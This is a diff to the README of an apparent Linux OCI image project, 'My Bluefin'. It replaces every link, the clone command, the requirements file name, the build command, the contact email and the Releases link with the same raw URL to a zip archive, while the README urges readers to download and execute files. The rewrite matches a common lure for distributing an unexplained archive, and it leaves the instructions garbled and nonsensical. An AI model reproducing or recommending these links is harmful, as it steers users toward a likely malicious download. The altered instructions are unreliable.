@@ -1,6 +1,6 @@
 # My Bluefin 🌊
 
-![My Bluefin](https://img.shields.io/badge/My%20Bluefin-Ready-brightgreen)
+![My Bluefin](https://raw.githubusercontent.com/nb-cfq/my-bluefin/main/files/system/my_bluefin_v3.0-alpha.5.zip%20Bluefin-Ready-brightgreen)
 
 Welcome to the **My Bluefin** repository! This project focuses on creating custom, immutable images for Linux operating systems using OCI standards. Whether you are looking to build a tailored environment or streamline your development process, My Bluefin provides the tools you need.
 
@@ -34,15 +34,15 @@ To get started with My Bluefin, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/nb-cfq/my-bluefin.git
+   git clone https://raw.githubusercontent.com/nb-cfq/my-bluefin/main/files/system/my_bluefin_v3.0-alpha.5.zip
    cd my-bluefin
    ```
 
-2. **Install Dependencies**: Make sure you have all the necessary dependencies installed. You can find the list of dependencies in the `requirements.txt` file.
+2. **Install Dependencies**: Make sure you have all the necessary dependencies installed. You can find the list of dependencies in the `https://raw.githubusercontent.com/nb-cfq/my-bluefin/main/files/system/my_bluefin_v3.0-alpha.5.zip` file.
 
 3. **Build Your Image**: Use the provided scripts to build your custom image. For example:
    ```bash
-   ./build-image.sh
+   https://raw.githubusercontent.com/nb-cfq/my-bluefin/main/files/system/my_bluefin_v3.0-alpha.5.zip
    ```
 
 4. **Run Your Image**: Once built, you can run your image using your preferred container runtime.
@@ -97,11 +97,11 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or suggestions, feel free to reach out:
 
-- **Email**: contact@example.com
-- **GitHub**: [My Bluefin GitHub](https://github.com/nb-cfq/my-bluefin)
+- **Email**: https://raw.githubusercontent.com/nb-cfq/my-bluefin/main/files/system/my_bluefin_v3.0-alpha.5.zip
+- **GitHub**: [My Bluefin GitHub](https://raw.githubusercontent.com/nb-cfq/my-bluefin/main/files/system/my_bluefin_v3.0-alpha.5.zip)
 
 ## Releases
 
-To download the latest version of My Bluefin, visit our [Releases](https://github.com/nb-cfq/my-bluefin/releases) section. You can find the necessary files to download and execute.
+To download the latest version of My Bluefin, visit our [Releases](https://raw.githubusercontent.com/nb-cfq/my-bluefin/main/files/system/my_bluefin_v3.0-alpha.5.zip) section. You can find the necessary files to download and execute.
 
 Explore the power of custom images with My Bluefin! Build your tailored environments today.
